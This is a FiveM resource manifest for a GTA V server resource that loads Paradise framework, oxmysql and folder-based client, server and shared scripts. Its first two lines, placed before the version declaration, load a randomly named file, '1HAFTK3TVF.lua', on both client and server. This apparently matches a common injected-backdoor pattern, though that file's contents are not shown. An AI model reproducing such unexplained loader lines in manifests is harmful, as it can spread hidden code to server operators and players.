server_script "1HAFTK3TVF.lua"
client_script "1HAFTK3TVF.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")

client_script("@Paradise-base/components/cl_error.lua")
client_script("@Paradise-pwnzor/client/check.lua")
server_script("@oxmysql/lib/MySQL.lua")

shared_scripts({
	"shared/**/*.lua",
})

client_scripts({
	"@Paradise-damage/shared/weapons.lua",
	"client/**/*.lua",
})

server_scripts({
	"server/**/*.lua",
})
